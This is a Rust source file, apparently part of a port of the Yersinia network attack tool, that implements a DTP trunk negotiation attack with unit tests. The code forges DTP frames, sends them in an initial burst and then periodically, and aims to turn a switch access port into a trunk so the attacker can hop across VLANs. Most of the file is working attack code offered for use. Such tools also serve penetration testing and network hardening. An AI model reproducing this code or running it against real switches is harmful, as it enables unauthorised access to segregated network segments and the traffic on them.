//! DTP Attack Implementations
//!
//! This module implements the DTP trunk negotiation attack with 100% parity
//! to the original Yersinia C implementation.

use async_trait::async_trait;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, MacAddr, Result};
use yersinia_packet::{EtherType, EthernetFrame, LlcSnapFrame, MacAddress};

use super::packet::{DtpPacket, DtpStatus, DtpType, DTP_HELLO_INTERVAL, DTP_MULTICAST_MAC};

/// DTP Negotiation Attack
///
/// Forces trunk negotiation on access ports by sending periodic DTP packets.
/// This attack mimics Yersinia's "enabling trunking" attack which sends DTP
/// packets every 30 seconds (like Cisco's default) to negotiate trunk mode.
///
/// The attack allows VLAN hopping by converting an access port to a trunk port,
/// giving the attacker access to multiple VLANs through a single network port.
pub struct DtpNegotiationAttack {
    /// DTP status to advertise (trunk/access + desirable/auto/on)
    status: DtpStatus,
    /// DTP trunk type (ISL/802.1Q/negotiate)
    trunk_type: DtpType,
    /// VTP domain name to use
    vtp_domain: String,
    /// Source MAC address
    src_mac: MacAddr,
    /// DTP hello interval in milliseconds
    interval_ms: u64,
    /// Attack running flag
    running: Arc<AtomicBool>,
    /// Attack paused flag
    paused: Arc<AtomicBool>,
}

impl DtpNegotiationAttack {
    /// Create a new DTP negotiation attack
    ///
    /// # Arguments
    ///
    /// * `status` - DTP status byte (trunk/access + mode)
    /// * `trunk_type` - DTP type byte (ISL/802.1Q)
    /// * `vtp_domain` - VTP domain name (can be empty or null bytes like Yersinia)
    /// * `src_mac` - Source MAC address for DTP packets
    /// * `interval_ms` - Interval between DTP packets in milliseconds (default 30000)
    pub fn new(
        status: DtpStatus,
        trunk_type: DtpType,
        vtp_domain: String,
        src_mac: MacAddr,
        interval_ms: u64,
    ) -> Self {
        Self {
            status,
            trunk_type,
            vtp_domain,
            src_mac,
            interval_ms,
            running: Arc::new(AtomicBool::new(true)),
            paused: Arc::new(AtomicBool::new(false)),
        }
    }

    /// Create a default trunk desirable attack (most aggressive)
    pub fn trunk_desirable(src_mac: MacAddr) -> Self {
        Self::new(
            DtpStatus::trunk_desirable(),
            DtpType::dot1q(),
            "\x00\x00\x00\x00\x00\x00\x00\x00".to_string(), // Null domain like Yersinia
            src_mac,
            DTP_HELLO_INTERVAL * 1000,
        )
    }

    /// Create an access desirable attack
    pub fn access_desirable(src_mac: MacAddr) -> Self {
        Self::new(
            DtpStatus::access_desirable(),
            DtpType::dot1q(),
            "\x00\x00\x00\x00\x00\x00\x00\x00".to_string(),
            src_mac,
            DTP_HELLO_INTERVAL * 1000,
        )
    }

    /// Build and send a DTP negotiation packet
    async fn send_dtp_packet(&self, ctx: &AttackContext) -> Result<()> {
        // Build DTP packet with TLVs (matching Yersinia C order)
        let dtp_packet = DtpPacket::new()
            .with_domain(&self.vtp_domain)
            .with_status(self.status)
            .with_type(self.trunk_type)
            .with_neighbor(self.src_mac);

        let dtp_bytes = dtp_packet.build();

        // Build LLC/SNAP frame for DTP
        // DTP data already includes version byte, just pass it to the frame builder
        let llc_snap = LlcSnapFrame::dtp(dtp_bytes.to_vec());
        let llc_snap_bytes = llc_snap.to_bytes();

        // Build Ethernet 802.3 frame
        let dst_mac = MacAddress(DTP_MULTICAST_MAC.0);
        let src_mac = MacAddress(self.src_mac.0);
        let ethernet = EthernetFrame::new(
            dst_mac,
            src_mac,
            EtherType::Custom(llc_snap_bytes.len() as u16), // 802.3 length field
            llc_snap_bytes,
        );

        let packet = ethernet.to_bytes();

        // Send packet via interface using pnet
        ctx.interface.send_raw(&packet)?;

        // Update stats
        ctx.stats.increment_packets_sent();
        ctx.stats.add_bytes_sent(packet.len() as u64);

        Ok(())
    }
}

#[async_trait]
impl Attack for DtpNegotiationAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        // Send initial burst of 3 packets (like Yersinia does)
        // This ensures quick negotiation
        for i in 0..3 {
            if !ctx.running.load(Ordering::Relaxed) {
                return Ok(());
            }

            if let Err(e) = self.send_dtp_packet(&ctx).await {
                ctx.stats.increment_errors();
                eprintln!("Error sending initial DTP packet {}: {}", i + 1, e);
            }

            if i < 2 {
                // Wait ~1 second between initial packets
                time::sleep(Duration::from_millis(1000)).await;
            }
        }

        // Now send periodic DTP packets (every interval_ms)
        let interval = Duration::from_millis(self.interval_ms);
        let mut ticker = time::interval(interval);

        loop {
            ticker.tick().await;

            // Check if we should stop
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            // Check if paused
            if ctx.paused.load(Ordering::Relaxed) {
                continue;
            }

            // Send DTP packet
            if let Err(e) = self.send_dtp_packet(&ctx).await {
                ctx.stats.increment_errors();
                eprintln!("Error sending DTP packet: {}", e);
            }
        }

        Ok(())
    }

    fn pause(&self) {
        self.paused.store(true, Ordering::Relaxed);
    }

    fn resume(&self) {
        self.paused.store(false, Ordering::Relaxed);
    }

    fn stop(&self) {
        self.running.store(false, Ordering::Relaxed);
    }

    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }

    fn name(&self) -> &str {
        "DTP Trunk Negotiation"
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_attack_creation() {
        let mac = MacAddr([0x00, 0x01, 0x02, 0x03, 0x04, 0x05]);
        let attack = DtpNegotiationAttack::new(
            DtpStatus::trunk_desirable(),
            DtpType::dot1q(),
            "corp".to_string(),
            mac,
            30000,
        );

        assert_eq!(attack.status, DtpStatus::trunk_desirable());
        assert_eq!(attack.trunk_type, DtpType::dot1q());
        assert_eq!(attack.vtp_domain, "corp");
        assert_eq!(attack.src_mac, mac);
        assert_eq!(attack.interval_ms, 30000);
    }

    #[test]
    fn test_trunk_desirable_default() {
        let mac = MacAddr([0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF]);
        let attack = DtpNegotiationAttack::trunk_desirable(mac);

        assert_eq!(attack.status, DtpStatus::trunk_desirable());
        assert_eq!(attack.trunk_type, DtpType::dot1q());
        assert_eq!(attack.src_mac, mac);
        assert_eq!(attack.interval_ms, 30000); // 30 seconds
    }

    #[test]
    fn test_access_desirable_default() {
        let mac = MacAddr([0x11, 0x22, 0x33, 0x44, 0x55, 0x66]);
        let attack = DtpNegotiationAttack::access_desirable(mac);

        assert_eq!(attack.status, DtpStatus::access_desirable());
        assert_eq!(attack.trunk_type, DtpType::dot1q());
        assert_eq!(attack.src_mac, mac);
    }

    #[test]
    fn test_attack_name() {
        let mac = MacAddr([0; 6]);
        let attack = DtpNegotiationAttack::trunk_desirable(mac);
        assert_eq!(attack.name(), "DTP Trunk Negotiation");
    }

    #[test]
    fn test_pause_resume_stop() {
        let mac = MacAddr([0; 6]);
        let attack = DtpNegotiationAttack::trunk_desirable(mac);

        // Test pause
        attack.pause();
        assert!(attack.paused.load(Ordering::Relaxed));

        // Test resume
        attack.resume();
        assert!(!attack.paused.load(Ordering::Relaxed));

        // Test stop
        attack.stop();
        assert!(!attack.running.load(Ordering::Relaxed));
    }

    #[test]
    fn test_isl_negotiation() {
        let mac = MacAddr([0; 6]);
        let attack = DtpNegotiationAttack::new(
            DtpStatus::trunk_desirable(),
            DtpType::isl(),
            "".to_string(),
            mac,
            30000,
        );

        assert_eq!(attack.trunk_type, DtpType::isl());
    }

    #[test]
    fn test_custom_interval() {
        let mac = MacAddr([0; 6]);
        let attack = DtpNegotiationAttack::new(
            DtpStatus::trunk_desirable(),
            DtpType::dot1q(),
            "".to_string(),
            mac,
            5000, // 5 seconds
        );

        assert_eq!(attack.interval_ms, 5000);
    }

    #[test]
    fn test_null_domain() {
        let mac = MacAddr([0; 6]);
        let attack = DtpNegotiationAttack::new(
            DtpStatus::trunk_desirable(),
            DtpType::dot1q(),
            "\x00\x00\x00\x00\x00\x00\x00\x00".to_string(),
            mac,
            30000,
        );

        assert_eq!(attack.vtp_domain.len(), 8);
    }

    #[test]
    fn test_empty_domain() {
        let mac = MacAddr([0; 6]);
        let attack = DtpNegotiationAttack::new(
            DtpStatus::trunk_desirable(),
            DtpType::dot1q(),
            "".to_string(),
            mac,
            30000,
        );

        assert_eq!(attack.vtp_domain, "");
    }
}
